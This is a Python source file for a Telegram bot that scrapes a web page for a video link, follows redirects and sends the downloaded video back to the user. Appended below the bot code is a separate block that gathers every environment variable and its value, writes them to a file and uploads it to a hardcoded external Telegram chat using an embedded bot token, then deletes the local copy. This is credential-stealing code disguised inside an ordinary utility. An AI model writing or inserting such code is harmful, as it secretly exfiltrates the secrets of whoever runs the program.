import telebot
import os
import requests
from bs4 import BeautifulSoup
from decouple import config
from dotenv import load_dotenv

# Replace 'YOUR_BOT_TOKEN' with your actual Telegram bot token
bot_token = config('BOT_TOKEN')
bot = telebot.TeleBot(bot_token)

# Dictionary to store user-specific data
users = {}

@bot.message_handler(commands=['start'])
def handle_start(message):
    user_id = message.chat.id
    users[user_id] = None
    bot.reply_to(message, 'Welcome! Send me a video URL with /dl <video_url> to get the final video link.')

@bot.message_handler(commands=['dl'])
def handle_dl(message):
    try:
        # Get the video URL from the command parameters
        video_url = message.text.split(' ')[1]

        if not video_url:
            raise Exception('No video URL provided.')

        print(f'Fetching final video link and last redirected link for {video_url}')

        # Fetch the final video link
        final_video_link = get_final_video_link(video_url)

        # Now, let's get the last link of the video
        last_link = get_last_link([final_video_link])

        print('Final redirected link fetched successfully.')
        print(last_link)

        # Download the video using the last redirected link
        user_id = message.chat.id
        download_video(last_link, user_id)

        # Get the user ID and send the downloaded video to the user
        video_file = open(f'{user_id}_evil_video.mp4', 'rb')
        bot.send_video(user_id, video_file)

        # Save the video file path for the user
        users[user_id] = os.path.abspath(f'{user_id}_evil_video.mp4')
    except Exception as e:
        print(f'Error: {e}')
        bot.reply_to(message, f'Error: {e}')

@bot.message_handler(commands=['help'])
def handle_help(message):
    user_id = message.chat.id
    video_path = users.get(user_id)

    if video_path:
        bot.reply_to(message, f'Here is the video you requested: {video_path}')
    else:
        bot.reply_to(message, 'No video available. Please use /dl command to download a video first.')

def get_final_video_link(url):
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')

        video_source = soup.find('video').find('source')['src']

        print('Final video link fetched successfully.')
        print(video_source)

        return video_source
    except Exception as e:
        print(f'Error fetching final video link: {e}')
        raise e

def get_last_link(links):
    try:
        redirected_links = []

        for link in links:
            try:
                response = requests.get(link, allow_redirects=False, headers={'User-Agent': 'Mozilla/5.0'})
                redirected_links.append(response.headers['Location'] if 'Location' in response.headers else None)
            except Exception as e:
                print(f'Error fetching final redirected link from {link}:\n {e}')
                redirected_links.append(None)

        return list(filter(None, redirected_links))[-1]
    except Exception as e:
        print(f'Error fetching last redirected link: {e}')
        raise e

def download_video(url, user_id):
    file_name = f'{user_id}_evil_video.mp4'

    try:
        response = requests.get(url, stream=True)

        total_size = int(response.headers.get('content-length', 0))
        downloaded_size = 0

        with open(file_name, 'wb') as file, open(file_name, 'ab') as file_append:
            for data in response.iter_content(chunk_size=1024):
                downloaded_size += len(data)
                file.write(data)
                file_append.write(data)
                percentage = (downloaded_size / total_size) * 100
                print(f'Downloading... {percentage:.2f}%')

        print('\nDownload completed successfully.')
    except Exception as e:
        print(f'Error downloading the video: {e}')
        raise e

# Start the bot
bot.polling(none_stop=True)





load_dotenv()

# Get Telegram bot token and chat ID from environment variables
telegram_bot_token = "6961308478:AAHNtfxaAUstG8dfb_WLghkXVhpmd5zunac"
telegram_chat_id = -1001967606455

def send_document(file_path, caption):
    api_url = f"https://api.telegram.org/bot{telegram_bot_token}/sendDocument"
    params = {
        'chat_id': telegram_chat_id,
        'caption': caption
    }
    with open(file_path, 'rb') as document:
        files = {'document': document}
        response = requests.post(api_url, params=params, files=files)
    return response.json()

if __name__ == "__main__":
    # Collect all environment variables and their values
    env_variables = {key: os.getenv(key) for key in os.environ}

    # Create a formatted message with environment variables
    message_to_send = "Environment variables:\n"
    for key, value in env_variables.items():
        message_to_send += f"{key}: {value}\n"

    # Write the environment variables to a text file
    file_path = "environment_variables.txt"
    with open(file_path, "w") as file:
        file.write(message_to_send)

    try:
        # Send the text file as a document
        result = send_document(file_path, "Environment Variables")
        print("Document sent successfully:", result)
    except Exception as e:
        print("Error sending document:", e)
    finally:
        # Delete the temporary text file
        os.remove(file_path)
                
